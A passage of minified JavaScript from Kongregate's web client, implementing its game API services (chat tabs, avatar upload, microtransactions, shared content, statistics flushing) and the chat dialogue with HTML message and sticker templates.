tab!"),this._customTabShowing=!1,this.clearChat(),this._eventDispatcher.fire({type:KonduitEvent.CUSTOM_TAB_CLOSE,data:{}})},clearChat:function(){this._queuedMessages=[],this._eventDispatcher.fire({type:KonduitEvent.CUSTOM_TAB_CLEAR_MESSAGES,data:{}})},onChatTabRequest:function(e){e=e.data,this._queuedMessages=[];var t=e.name;if(ChatService.DEFAULT_TAB===t)this.closeTab();else{var i=e[KonduitEvent.PARAM_CANVAS_SIZE];(!isFinite(i)||0>i)&&(i=.5),this.clearChat(),this._eventDispatcher.fire({type:KonduitEvent.CUSTOM_TAB_SHOW,data:{name:t,description:e.desc,size:Math.min(i,1)/2}})}},onCustomTabShown:function(e){Kongregate.Log.info("Custom tab visible!"),this._customTabShowing=!0,this.flushMessageQueue();var t={};t[KonduitEvent.PARAM_CANVAS_SIZE]=e.data,this._eventDispatcher.sendMessage(KonduitEvent.OP_CHAT_TAB,t)},onChatDisplayRequest:function(e){var t=e.data;e=t.user,t=Kongregate.LanguageFilter.filter(t.data),e&&t&&(0===e.indexOf("@")&&(e=e.substr(1,e.length-1)),this._eventDispatcher.fire({type:KonduitEvent.CUSTOM_TAB_MESSAGE,data:{user:{username:e},message:t}}))},onCustomTabMessage:function(e){e=e.data,this._eventDispatcher.sendMessage(KonduitEvent.OP_CHAT_MSG,{user:e.user.username,data:e.message})},onCanvasElementRequest:function(e){this._queuedMessages.push({type:e.type,data:e.data.data}),this._customTabShowing&&this.flushMessageQueue()},flushMessageQueue:function(){var e=this;this._queuedMessages.forEach((function(t){e._konduitToCanvas(t)})),this._queuedMessages=[]}},ChatService.DEFAULT_TAB="Default",ChatService.CUSTOM_TAB="custom",ImageService=function(e){this.initialize(e)},ImageService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._eventDispatcher.register(KonduitEvent.OP_IMAGE_AVATAR_SUBMIT,this.onAvatarSubmit.bind(this)),this._eventDispatcher.register(KonduitEvent.IMAGE_AVATAR_COMPLETE,this.onAvatarSubmissionResult.bind(this))},onAvatarSubmit:function(e){if(this._activeUser.isAuthenticated()){var t=this;$j.ajax({method:"POST",url:"/image_importer",data:{base64:e.data.image||Kongregate.DEFAULT_ICON_BASE64},success:function(e){t._eventDispatcher.fire({type:KonduitEvent.IMAGE_AVATAR_SUBMIT,data:{filename:e}})},error:this.onFailure.bind(this)})}else this.onFailure()},onAvatarSubmissionResult:function(e){this._eventDispatcher.sendMessage(KonduitEvent.OP_IMAGE_AVATAR_FINISHED,{success:e.data.success})},onFailure:function(){this.onAvatarSubmissionResult({data:{success:!1}})}},KonduitJavascriptAdapter=function(e){this.initialize(e)},KonduitJavascriptAdapter.IGNORED_EVENTS=[KonduitEvent.ADD_STATISTICS],KonduitJavascriptAdapter.prototype={initialize:function(e){this._activeUser=e.activeUser,this._eventDispatcher=e.eventDispatcher,this._klient=Kongregate.Utils.isKlient(),this.initializeEventMap(),this.initializeMessageConnection()},initializeMessageConnection:function(){this.messageConnection=new Kongregate.MessageConnection({channel_id:window.channel_id}),this.messageConnection.addMessageListener(this._onClientMessage.bind(this)),this.messageConnection.listen()},initializeEventMap:function(){this._eventMap={},this._eventMap[KonduitEvent.CUSTOM_TAB_SHOW]=KonduitEvent.CUSTOM_TAB_SHOWN,this._eventMap[KonduitEvent.CUSTOM_TAB_MESSAGE]=KonduitEvent.OP_CHAT_MSG,this._eventMap[KonduitEvent.SWITCH_USER]=KonduitEvent.SWITCH_USER,this._eventMap[KonduitEvent.IMAGE_AVATAR_COMPLETE]=KonduitEvent.IMAGE_AVATAR_COMPLETE,this._eventMap[KonduitEvent.OP_LOAD_SHARED_CONTENT]=KonduitEvent.OP_LOAD_SHARED_CONTENT,this._eventMap[KonduitEvent.OP_SHARED_CONTENT_SAVE_COMPLETE]=KonduitEvent.OP_SHARED_CONTENT_SAVE_COMPLETE},_onClientMessage:function(e,t){this._eventDispatcher.fire({type:KonduitEvent.KONDUIT_MESSAGE,data:{outgoing:!0,opcode:e,params:t}})},_setLocalConnectionOnly:function(e,t){e[t]=$j.extend({},e[t]),e[t][KonduitEvent.PARAM_LOCALCONNECTION_ONLY]=!0},_forwardToKlient:function(e){this._klient&&top.postMessage({type:"kongregate:api-message:in",message:{opcode:e.opcode,params:e.params}},"*")},dispatchEvent:function(e){var t=this._eventMap[e.type];if(t)return this._eventDispatcher.fire({type:t,data:e.data}),!0;if(0<=KonduitJavascriptAdapter.IGNORED_EVENTS.indexOf(e.type))return!0;if(this._forwardToKlient(e),!this.messageConnection.connected())return!1;if(e.type===KonduitEvent.KONDUIT_MESSAGE)this.messageConnection.sendMessage(e.opcode,e.params||{});else this.messageConnection.sendMessage(KonduitEvent.OP_EXTERNAL_MESSAGE,{opcode:e.type,data:e.data});return this._setLocalConnectionOnly(e,e.data?"data":"params"),!1}},MicrotransactionService=function(e){this.initialize(e)},MicrotransactionService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._activeUser.mtxApiEnabled()&&(this._eventDispatcher=e.event_dispatcher,this._eventDispatcher.register(KonduitEvent.ITEM_LIST,this.onItemListRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.ITEM_CHECKOUT,this.onItemCheckoutRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.PURCHASE_KREDS,this.onKredPurchaseRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.ITEM_INSTANCES,this.onItemInstanceRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.USE_ITEM_INSTANCE,this.onUseItemInstanceRequest.bind(this)))},onItemListRequest:function(e){var t=this._eventDispatcher,i=(e.data.item_tags||[]).filter((function(e){return"string"==typeof e&&0<e.length})),n=function(i){var n=i.success,s={success:n};s[KonduitEvent.PARAM_REQUEST_ID]=e.data[KonduitEvent.PARAM_REQUEST_ID],n&&(s.data=i.items),t.sendMessage(KonduitEvent.ITEM_LIST,s)},s={api_key:this._activeUser.gameId()};i.length&&(s.tags=i.join(",")),Kongregate.Log.info("Requesting item list from server"),$j.ajax({url:"/api/items.json",cache:!1,data:s,success:n,error:function(){n({success:!1})}})},onItemCheckoutRequest:function(e){var t=e.data.items,i=e.data.order_info;if(t){t=MicrotransactionService.buildCartJSON(t);var n="/checkouts/new?cart="+encodeURIComponent(t)}else i&&(n="/checkouts/new?order_info="+encodeURIComponent(i));n?(Kongregate.Log.info("Path:",n),this._eventDispatcher.fire({type:KonduitEvent.HANDLE_ITEM_CHECKOUT_REQUEST,data:{url:"https://"+location.host+this._activeUser.gameResourcePath()+n}})):Kongregate.Log.warn("Couldn't build a URL from item message:",e.data)},onItemInstanceRequest:function(e){var t=this._eventDispatcher,i=e.data.user,n=function(n){Kongregate.Log.info("Item instance list received for "+i);var s=n.success,o={success:s};o[KonduitEvent.PARAM_REQUEST_ID]=e.data[KonduitEvent.PARAM_REQUEST_ID],s&&(o.data=n.items),t.sendMessage(KonduitEvent.ITEM_INSTANCES,o)};Kongregate.Log.info("Requesting item list from server"),$j.ajax({url:"/api/user_items.json",cache:!1,data:{api_key:this._activeUser.gameId(),username:i},success:n,error:function(){n({success:!1})}})},onUseItemInstanceRequest:function(e){var t=e.data.id,i=this._eventDispatcher,n=function(n){var s={success:n=n.success,id:t};Kongregate.Log.info("Item instance use result for item instance id:"+t+", success: "+n),s[KonduitEvent.PARAM_REQUEST_ID]=e.data[KonduitEvent.PARAM_REQUEST_ID],i.sendMessage(KonduitEvent.USE_ITEM_INSTANCE,s)};Kongregate.Log.info("Requesting item instance use for item ID: "+t),$j.ajax({url:"/api/use_item.json",method:"POST",data:{api_key:this._activeUser.gameId(),user_id:this._activeUser.id(),game_auth_token:this._activeUser.gameAuthToken(),id:t},success:n,error:function(){n({success:!1})}})},onKredPurchaseRequest:function(e){this._activeUser.activateKredPurchase(e.data.purchase_method)}},MicrotransactionService.buildCartJSON=function(e){return e&&0!==e.length?(e=e.map((function(e){return e?"string"==typeof e||$j.isNumeric(e)?{identifier:e}:Array.isArray(e)?1<=e.length?{identifier:e[0],data:e[1]}:null:"string"==typeof e.identifier&&0<e.identifier.length||null!=e&&$j.isNumeric(e.identifier)?e:null:null})).filter((function(e){return null!==e})),JSON.stringify(e)):"[]"},SharedContentService=function(e){this.initialize(e)},SharedContentService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._eventDispatcher.register(KonduitEvent.SAVE_SHARED_CONTENT,this.onSaveSharedContentRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_LOAD_SHARED_CONTENT,this.onSharedContentLoaded.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_SHARED_CONTENT_SAVE_COMPLETE,this.onSharedContentSaved.bind(this))},onSharedContentLoaded:function(e){var t=e.data,i={};i[KonduitEvent.PARAM_DATA]=t.content,i[KonduitEvent.PARAM_CONTENT_TYPE]=t.contentType,i[KonduitEvent.PARAM_NAME]=t.name,i[KonduitEvent.PARAM_PERMALINK]=t.permalink,i[KonduitEvent.PARAM_ID]=t.id,i[KonduitEvent.PARAM_LABEL]=t.label,this._eventDispatcher.sendMessage(e.type,i)},onSharedContentSaved:function(e){var t=e.data,i={};i[KonduitEvent.PARAM_DATA]=t.content,i[KonduitEvent.PARAM_SUCCESS]=t.success,i[KonduitEvent.PARAM_NAME]=t.name,i[KonduitEvent.PARAM_PERMALINK]=t.permalink,i[KonduitEvent.PARAM_ID]=t.id,i[KonduitEvent.PARAM_LABEL]=t.label,this._eventDispatcher.sendMessage(e.type,i)},onSaveSharedContentRequest:function(e){var t=e.data;if(!t.filename)if(this._activeUser.sharedContentApiEnabled()){var i=this;$j.ajax({method:"POST",url:"/image_importer",data:{base64:t.image||Kongregate.DEFAULT_ICON_BASE64},success:function(e){i._eventDispatcher.fire({type:KonduitEvent.SAVE_SHARED_CONTENT,data:{contentType:t.content_type,content:t.data,label:t.label,filename:e}})},error:this.saveFailed.bind(this)}),this._eventDispatcher.fire({type:KonduitEvent.PROCESSING_SAVE_SHARED_CONTENT})}else this._eventDispatcher.fire({type:KonduitEvent.SAVE_SHARED_CONTENT,data:{}}),this.saveFailed()},saveFailed:function(){this._eventDispatcher.sendMessage(KonduitEvent.SAVE_SHARED_CONTENT_COMPLETE,{name:null,data:null,label:null,id:null,permalink:null,success:!1})}},StatisticService=function(e){this.initialize(e)},StatisticService.MAX_STATS_FOR_PRIORITY={low:10,medium:10,high:5},StatisticService.LOW_PRIORITY_FLUSHER_INTERVAL=6e4,StatisticService.MEDIUM_PRIORITY_FLUSHER_INTERVAL=1e4,StatisticService.HIGH_PRIORITY_FLUSHER_INTERVAL=1e4,StatisticService.prototype={initialize:function(e){this._statistics=e.statistics,this._isConnected=e.is_connected||function(){return!1},this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._started=!1;var t=this;this._activeUser.addOnAuthenticatedObserver(this.start.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_STATS_SUBMIT,(function(e){t.submitStats(e.data.stats)}))},start:function(){if(this._activeUser.isAuthenticated()&&!this._started){this._started=!0;var e=this.lowPriorityStats(),t=this.mediumPriorityStats(),i=this.highPriorityStats();Kongregate.Log.debug("Initializing statistic service!"),Kongregate.Log.debug("Stats count. Low:"+e.length+", Med:"+t.length+", High: "+i.length),Kongregate.Log.debug({lowStats:e}),Kongregate.Log.debug({mediumStats:t}),Kongregate.Log.debug({highStats:i}),this.flushStatsWithIncompleteTasks(),this.startTimers(),this._eventDispatcher.register(KonduitEvent.STATISTICS_FLUSH,this.onStatisticsFlush.bind(this)),this._eventDispatcher.register(KonduitEvent.STATISTICS_FORCE_FLUSH,this.onForceFlush.bind(this)),this._eventDispatcher.register(KonduitEvent.DISCONNECT,this.onDisconnect.bind(this))}},startTimers:function(){var e=this;this._lowPriorityFlusher=setInterval((function(){e.flushPriorityStats(Statistic.LOW)}),StatisticService.LOW_PRIORITY_FLUSHER_INTERVAL),this._mediumPriorityFlusher=setInterval((function(){e.flushPriorityStats(Statistic.MEDIUM)}),StatisticService.MEDIUM_PRIORITY_FLUSHER_INTERVAL),this._highPriorityFlusher=setInterval((function(){e.flushPriorityStats(Statistic.HIGH)}),StatisticService.HIGH_PRIORITY_FLUSHER_INTERVAL)},stop:function(){clearInterval(this._lowPriorityFlusher),clearInterval(this._mediumPriorityFlusher),clearInterval(this._highPriorityFlusher)},reset:function(){Kongregate.Log.info("Resetting statistic service"),this._statistics.forEach((function(e){e.reset()}))},submitStats:function(e){if(e&&e.length)for(var t=0;t<e.length;t++)this.submit(e[t].name,e[t].value)},submit:function(e,t){var i=this._statistics.find((function(t){return t.name()===e}));i?(t=Math.floor(t),i.attemptUpdate(t)&&(this._activeUser.isAuthenticated()||this.dispatchEvent(KonduitEvent.STATISTIC_UPDATED,{id:i.id(),value:i.value()})),this._activeUser.isAuthenticated()&&i.sendImmediately()&&(Kongregate.Log.debug("Instantly flushing",i),this.flushStats([i]))):Kongregate.Log.warn("No statistic named "+e+" found, ignoring")},flushStats:function(e){if(this._activeUser.isAuthenticated())if(this._isConnected&&!this._isConnected())Kongregate.Log.warn("Holding off on statistic flush since we're not connected");else{var t={};e.filter((function(e){return e.id&&void 0!==e.id()&&null!==e.id()})).forEach((function(e){t[e.id()]=e.valueToSend(),e.markAsSent()})),0!==Object.keys(t).length&&this.dispatchEvent(KonduitEvent.STATISTICS_FLUSH,{user:this._activeUser.username(),stats:JSON.stringify(t)})}},flushPriorityStats:function(e){if(this._activeUser.isAuthenticated()){var t=Statistic.sortOnSentAt(this.statsForPriority(e)).filter((function(e){return e.readyToSend()})).slice(0,this.maxStatsToSendForPriority(e));if(0!==t.length){var i={};i["flush"+e]=t,Kongregate.Log.debug(i),this.flushStats(t)}}},flushStatsWithIncompleteTasks:function(){var e=this._statistics.filter((function(e){return e.readyToSend()&&e.hasIncompleteTasks()}));0<e.length&&(Kongregate.Log.info("Flushing all stats with tasks, length="+e.length),this.flushStats(e))},processServerResponse:function(e){if(this._activeUser.isAuthenticated())if(e.user_id&&e.user_id!==this._activeUser.id())Kongregate.Log.warn("Not processing stats response since it was for a different user");else{if(!e.success&&e.retry)return this.resetPendingValues();this.parseAddStats(e["stats.add"]),this.parseServerStats(e.stats),this.parseTaskStatsProgressed(e["stats.prgs"]),this.parseCurrentHighScores(e["stats.current_high"])}else this.reset()},parseAddStats:function(e){this.forEachStatId(e,(function(e,t){e.setSavedValue(t)}))},parseServerStats:function(e){this.forEachStatId(e,(function(e,t){Statistic.ADD_TYPE===e.type()?e.setPendingValue(e.pendingValue()-t):(e.betterThanSavedValue(t)&&e.setSavedValue(t),(e.betterThanPendingValue(t)||t==e.pendingValue())&&e.setPendingValue(null)),ApiLogger.echoToConsole("debug","["+e.name()+"-ServerUpdate]: submitted="+t+", saved="+e.savedValue()+", pending="+e.pendingValue()+", value="+e.value())}))},parseTaskStatsProgressed:function(e){if(e)for(var t in e)e.hasOwnProperty(t)&&this.dispatchEvent(KonduitEvent.STATISTIC_UPDATED,{id:parseInt(t,10),value:e[t]})},parseCurrentHighScores:function(e){if(e&&e.length){var t=this;this.forEachStatId(e,(function(e){t.dispatchEvent(KonduitEvent.NEW_HIGH_SCORE,{id:e.id(),value:e.savedValue()})}))}},onForceFlush:function(){Kongregate.Log.info("Forcing flush of all statistics"),this.flushStats(this._statistics)},onStatisticsFlush:function(e){e.data.result&&this.processServerResponse(e.data)},onDisconnect:function(e){Kongregate.Log.debug("Disconnect detected, resetting statistic pending values"),this.resetPendingValues()},resetPendingValues:function(){this._statistics.forEach((function(e){e.resetPendingValue()}))},dispatchEvent:function(e,t){this._eventDispatcher.fire({type:e,data:t})},lowPriorityStats:function(){return this.statsForPriority(Statistic.LOW)},mediumPriorityStats:function(){return this.statsForPriority(Statistic.MEDIUM)},highPriorityStats:function(){return this.statsForPriority(Statistic.HIGH)},statsForPriority:function(e){return this._statistics.filter((function(t){return e===t.priority()}))},forEachStatId:function(e,t){if(e){var i,n=Object.isArray(e);for(i in e)if(e.hasOwnProperty(i)){var s=n?this.statForId(e[i]):this.statForId(i);s?t(s,n?null:e[i]):ApiLogger.echoToConsole("warn","Statistic ID "+i+" not found")}}},statForId:function(e){return this._statistics.find((function(t){return t.id()==e}))},maxStatsToSendForPriority:function(e){return StatisticService.MAX_STATS_FOR_PRIORITY[e]||5}},ChatApiTab=function(e){this.initialize(e)},ChatApiTab.prototype={initialize:function(e){if(this._holodeck=e.holodeck,this._node=$("chat_api_pane")){this._canvas_node=this._node.down("#chat_api_canvas"),this._title_node=this._node.down(".chat_api_pane_title");var t=this,i=this._holodeck;this._chat_dialogue=new ChatDialogue(this._node,(function(e){t.sentMessage(e),i.konduit().dispatchEvent({type:KonduitEvent.CUSTOM_TAB_MESSAGE,data:{message:e,user:{username:i.username()}}})}),this._holodeck,this._holodeck.chatWindow())}},sentMessage:function(e){this._chat_dialogue.displayMessage(this._holodeck.username(),e,{},{non_user:!0})},receivedMessage:function(e){this._chat_dialogue.displayMessage(e.data.user.username,e.data.message,{},{non_user:!0})},clearMessages:function(e){this._chat_dialogue.clear()},setTabInfo:function(e){var t=this._holodeck.height(),i=parseInt(e.data.size*t,10);t=Math.min(t-94,t-i-80),$("chat_api_canvas").setStyle({height:i+"px"}),this._chat_dialogue.setMessageWindowHeight(t),this._title_node.update(e.data.description),e="string"==typeof e.data.name?e.data.name.substr(0,10):"Match",$("chat_api_title").update(e)}},ChatDialogue=function(e,t,i,n,s){this.initialize(e,t,i,n,s)},ChatDialogue.MAX_CHARS_PER_MESSAGE=250,ChatDialogue.SCROLL_FUDGE=35,ChatDialogue.VERY_LARGE_SCROLL=131072,ChatDialogue.COLLECTION_PERIOD=8,ChatDialogue.MESSAGE_TEMPLATE=new Template('<p class="#{classNames}">\n<span class="timestamp">#{timestamp}</span>\n<span username="#{username}" class="username #{userClassNames}">\n<span username="#{username}" class="truncate">#{prefix}#{username}</span>:\n</span>\n<span class="message hyphenate">#{message}</span>\n</p>'),ChatDialogue.STICKER_MESSAGE_TEMPLATE=new Template('<p class="#{classNames}">\n<span class="timestamp">#{timestamp}</span>\n<span username="#{username}" class="username #{userClassNames}" style="float: left">\n<span username="#{username}" class="truncate">#{prefix}#{username}</span>:\n</span>\n<span class="chat-msg-sticker">\n<img src="#{stickerUrl}" alt="Sticker #{stickerId} #{stickerVariant}" class="chat-msg-sticker__img"></img>\n<span class="chat-msg-sticker__tooltip">\n#{stickerPackName} Pack\n<span class="chat-msg-sticker__tooltip-lvl #{stickerVariant}">Lv <strong>#{stickerLevel}</strong> <span class="pack-quality--#{stickerQuality}"></span></span>\n</span>\n</span>\n</p>'),ChatDialogue.GUILD_MESSAGE_TEMPLATE=new Template('<p class="#{classNames}">\n<span class="timestamp">#{timestamp}</span>\n<span username="#{username}" class="username #{userClassNames}">\n<span username="#{username}" class="truncate">#{prefix}#{username}</span>\n</span>\n<span class="guildname">\n<span class="truncate">#{characterName}</span>:\n</span>\n<span class="message hyphenate">#{message}</span>\n</p>'),ChatDialogue.GUEST_MESSAGE_TEMPLATE=new Template('<p class="#{classNames}">\n<span class="timestamp">#{timestamp}</span>\n<span class="guildname">\n<span class="truncate">#{characterName}</span>:\n</span>\n<span class="message hyphenate">#{message}</span></p>'),ChatDialogue.MOTD_MESSAGE_TEMPLATE=new Template('<p class="whisper received_whisper">\n<span class="timestamp">#{timestamp}</span>\n<span username="#{username}" class="username #{userClassNames}">\n<span username="#{username}" class="truncate">#{prefix}#{username}</span>:\n</span>\n<span class="message hyphenate">#{message}</span>\n</p>'),ChatDialogue.GUILD_JOIN_TEMPLATE=new Template('<p class="room-activity joined-guild">\n<span class="msg">\n<strong title="#{characterName}" class="truncate">#{characterName}</strong> joined the guild\n</span>\n</p>'),ChatDialogue.GUILD_LEAVE_TEMPLATE=new Template('<p class="room-activity joined-guild">\n<span class="msg">\n<strong title="#{characterName}" class="truncate">#{characterName}</strong> left the guild\n</span>\n</p>'),ChatDialogue.STICKER_TAB_TEMPLATE=new Template('<button role="tab" aria-selected="false" aria-controls="sticker-pack-#{id}-tab" class="chat-sticker-nav__btn" data-sticker-pack-id="#{id}" tabindex="-1">\n<img alt="#{name}" src="#{iconUrl}" class="chat-sticker-nav__ico">\n</button>'),ChatDialogue.STICKER_BUTTON_TEMPLATE=new Template('<li class="chat-sticker-tab__sticker">\n<button class="chat-sticker-tab__btn" data-sticker-id="#{type}-#{id}">\n<img alt="#{name}" src="#{iconUrl}" class="chat-sticker-tab__img">\n</button>\n</li>'),ChatDialogue.RECENT_STICKER_BUTTON_TEMPLATE=new Template('<button role="tab" aria-selected="false" aria-controls="sticker-recent-tab" class="chat-sticker-nav__btn" data-sticker-pack-id="recent" tabindex="-1">\n<svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" viewBox="0 0 24 24" class="chat-sticker-nav__recent">\n<g style="fill:none;stroke:#000;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10">\n<circle cx="12" cy="12" r="11"/>\n<path d="m8 13h4v-6"/>\n</g>\n</svg>\n</button>'),ChatDialogue.STICKER_ADD_BUTTON_TEMPLATE=new Template('<button role="tab" aria-selected="false" aria-controls="sticker-add-tab" class="chat-sticker-nav__btn chat-sticker-nav__add" data-sticker-pack-id="add" tabindex="-1">\n+\n</button>'),ChatDialogue.prototype={initialize:function(e,t,i,n,s){this._messages_until_next_collection=0,this._holodeck=i,this._sticker_manager=i._sticker_manager,this._chat_window=n,this._room=s,this._parent_node=e,this._messages_count=0,this._onInputFunction=t,this._message_window_node=e.down(".chat_message_window"),this._input_node=e.down(".chat_input"),this._chars_remaining_node=$j(e.down(".chat_chars_remaining")),this._chat_text_controls_node=$j(e.down(".chat_text_controls")),this._chat_sticker_controls_node=$j(e.down(".chat_sticker_controls")),this._sticker_button_node=$j(e.down(".chat-sticker-btn")),this._text_button_node=$j(e.down(".chat-sticker-nav__txt")),this._sticker_tabs_node=$j(e.down(".chat-sticker-nav__btns")),this._sticker_pack_commons=$j(e.down(".chat-sticker-tab__normal")),this._sticker_pack_shinies=$j(e.down(".chat-sticker-tab__shiny")),this._sticker_tab_node=$j(e.down(".chat-sticker-tab")),this._sticker_market_tab_node=$j(e.down(".chat-sticker-market-tab")),this._chat_message_window=$j(e.down(".chat_message_window")),this._sticker_next_button=$j(e.down(".chat-sticker-nav__next")),this._sticker_prev_button=$j(e.down(".chat-sticker-nav__prev")),this._sticker_pop_node=$j("#chat_container_cell .c-sticker-preview").first(),this._messages_to_retain=parseInt(document.location.href.parseQuery().messages_to_retain,10)||200;var o=this;this._input_node.observe("keypress",(function(e){o.onKeyPress(e)})),this._input_node.observe("focus",(function(e){o.clearPrompt()})),$j(this._input_node).on("textchange",(function(){o.updateCharsRemaining(o._input_node)})),this._message_window_node.observe("click",(function(e){if(e.target){var t=e.target.getAttribute("username");t&&(e.stop(),n.showProfile(t))}})),this.setupStickers()},focus:function(){this._input_node.focus()},onKeyPress:function(e){e.keyCode==Event.KEY_RETURN&&(this.sendInput(),this.updateCharsRemaining(e.target),e.stop())},updateCharsRemaining:function(e){if((e=e.value.length)>ChatDialogue.MAX_CHARS_PER_MESSAGE)return this._chars_remaining_node.addClass("full").text(ChatDialogue.MAX_CHARS_PER_MESSAGE-e),!1;this._chars_remaining_node.removeClass("full").text(ChatDialogue.MAX_CHARS_PER_MESSAGE-e)},clearPrompt:function(){this._input_node.hasClassName("prompt_text")&&(this._input_node.removeClassName("prompt_text"),this._input_node.value="",this._input_node.stopObserving("focus"))},sendInput:function(){var e=this._input_node.value;this._holodeck.processChatCommand(e)&&this._holodeck.filterOutgoingMessage(e,this._onInputFunction),this._input_node.value=""},disable:function(){this._parent_node.down(".chat_controls").hide()},enable:function(){this._parent_node.down(".chat_controls").show()},displayUnsanitizedMessage:function(e,t,i,n){if(i||(i={}),n||(n={}),allow_mutes=(active_room=this._holodeck.chatWindow().activeRoom())&&!active_room.canUserModerate(active_room.self())||n.whisper,!allow_mutes||!this._chat_window.isMuted(e)){var s=n.non_user?"chat_message_window_undecorated_username":"chat_message_window_username",o=e==this._chat_window.username(),a=[];s=[s];var r=n.private?"To ":"";this._messages_count%2&&a.push("even"),i.class&&a.push(i.class),o&&s.push("is_self"),n.timestamp=n.timestamp?new Date(n.timestamp):new Date,n.formatted_timestamp=n.timestamp.format("mmm d - h:MMTT"),(i="string"==typeof t?null:t.stickerId)&&(n.template=ChatDialogue.STICKER_MESSAGE_TEMPLATE,n.stickerId=i,n.stickerVariant=t.stickerVariant,n.stickerPackName=t.stickerPackName,n.stickerLevel=t.level,n.stickerQuality=100<=t.level?t.quality+" is-ranked":t.quality,n.stickerUrl=this._sticker_manager.url(i,n.stickerVariant,72)),e=this.messageContent({prefix:r,username:e,message:t,classNames:a.join(" "),userClassNames:s.join(" "),characterName:n.characterName,timestamp:n.formatted_timestamp,template:n.template,stickerId:n.stickerId,stickerVariant:n.stickerVariant,stickerUrl:n.stickerUrl,stickerLevel:n.stickerLevel,stickerQuality:n.stickerQuality,stickerPackName:n.stickerPackName}),this.insert(e,null,{timestamp:n.timestamp}),this._messages_count++}},messageContent:function(e){var t=!e.username.match(/^_/);return(e.template?e.template:e.characterName&&t?ChatDialogue.GUILD_MESSAGE_TEMPLATE:t?ChatDialogue.MESSAGE_TEMPLATE:ChatDialogue.GUEST_MESSAGE_TEMPLATE).evaluate(e)},displayMessage:function(e,t,i,n){var s=this,o=function(t){s.displayUnsanitizedMessage(e,t,i,n)};"string"==typeof t?this._holodeck.filterIncomingMessage(t,o):o(t)},kongBotMessage:function(e){this.displayMessage("Kong Bot",e,{class:"whisper received_whisper"},{non_user:!0})},displaySystemMessage:function(e,t){switch(e.type){case"guild_join":this.displayUnsanitizedMessage("Kong Bot",null,{},{non_user:!0,timestamp:t,characterName:e.character_name,template:ChatDialogue.GUILD_JOIN_TEMPLATE});break;case"guild_leave":this.displayUnsanitizedMessage("Kong Bot",null,{},{non_user:!0,timestamp:t,characterName:e.character_name,template:ChatDialogue.GUILD_LEAVE_TEMPLATE})}},insert:function(e,t,i){var n=this,s=this._message_window_node,o=this._holodeck;o.scheduleRender((function(){var a=s.getHeight(),r=a+s.scrollTop+ChatDialogue.SCROLL_FUDGE>=s.scrollHeight,c=0!==a&&r;o.scheduleRender((function(){("string"==typeof e||e instanceof String)&&(e=$j("<div/>",{html:e,class:"chat-message"})),i=i||{};var o,a=$j(e).data(i),r=!1;$j(s).children(".chat-message").each((function(){var e=$j(this).data("timestamp");if(e>i.timestamp)return o=this,n.sameTimestamps(i.timestamp,e)&&$j(this).find(".timestamp").hide(),!1;!r&&i.timestamp&&n.sameTimestamps(i.timestamp,e)&&(r=!0)})),r&&a.find(".timestamp").hide(),o?(a.insertBefore(o),c=!1):a.appendTo(s),c&&n.scrollToBottom(),t&&t()}))}))},scrollToBottom:function(){this._message_window_node.scrollTop=ChatDialogue.VERY_LARGE_SCROLL},setInput:function(e){this.clearPrompt();var t=this._input_node;setTimeout((function(){t.setValue(e),t.positionCaretAtEnd()}),0)},sendPrivateMessage:function(e,t){this._chat_window.sendPrivateMessage(e,t),this.displayMessage(e,t,{class:"whisper sent_whisper"},{private:!0})},receivedPrivateMessage:function(e){if(e.data.success){var t=this;this._holodeck.filterIncomingMessage(e.data.message,(function(i){t.displayUnsanitizedMessage(e.data.from,i+'&nbsp; (<a class="reply_link" onclick="holodeck.insertPrivateMessagePrefixFor(\''+e.data.from+'\');return false;" href="#">reply</a>)',{class:"whisper received_whisper"},{whisper:!0})}))}else this.kongBotMessage(e.data.to+" cannot be reached. Please try again later.")},setMessageWindowHeight:function(e){this._message_window_node.setStyle({height:e+"px"})},clear:function(){this._message_window_node.update("")},earliestTimestamp:function(){var e=$j(this._message_window_node).children(".chat-message").first();return e&&e.data("timestamp")?e.data("timestamp")/1e3:0},sameTimestamps:function(e,t){return void 0!==e&&void 0!==t&&e.getYear()===t.getYear()&&e.getMonth()===t.getMonth()&&e.getDay()===t.getDay()&&e.getHours()===t.getHours()&&e.getMinutes()===t.getMinutes()},stickersEnabled:function(){return this._room&&this._room.supportsStickers()},setupStickers:function(){if(!this.stickersEnabled())return this._sticker_button_node.remove();this._sticker_manager.on("update",this.onStickersUpdated.bind(this)),this._sticker_manager.on("update-recent",this.updateRecentStickers.bind(this)),this._sticker_button_node.on("click",this.showStickerControls.bind(this)),this._text_button_node.on("click",this.hideStickerControls.bind(this)),this._sticker_next_button.on("click",this.scrollStickers.bind(this,64)),this._sticker_prev_button.on("click",this.scrollStickers.bind(this,-64)),this.insertStickerCollections(),this.insertAddStickerButton()},showStickerControls:function(){this._chat_text_controls_node.hide(),this._chat_sticker_controls_node.show(),this.insertRecentStickerButton(),this._sticker_tabs_node.scrollLeft(0),this.scrollToBottom(),this._recent_stickers_node?this.showRecentStickers():this.showUserStickers(this._sticker_manager.userStickerCollections[0]);var e=this,t=!1,i=0,n=0;$j(document).on("mousedown.stickers",(function(s){s.target.closest(".chat-sticker-nav__btns")&&(t=!0,i=s.clientX,n=e._sticker_tabs_node.scrollLeft())})),$j(document).on("mouseup.stickers",(function(){t&&(t=!t,e._sticker_tabs_node[0].classList.remove("is-dragging"))})),$j(document).on("mousemove.stickers",(function(s){t&&3<Math.abs(i-s.clientX)&&(e._sticker_tabs_node[0].classList.add("is-dragging"),e._sticker_tabs_node.scrollLeft(n+i-s.clientX))}))},hideStickerControls:function(){this._chat_sticker_controls_node.hide(),this._chat_text_controls_node.show(),this.hideStickerPopup(),$j(document).off(".stickers")},onStickerClicked:function(e,t){this._room.sendSticker(e.id,t),this.hideStickerControls()},onStickersUpdated:function(){this.insertStickerCollections()},insertStickerNodeIntoTab:function(e,t,i){var 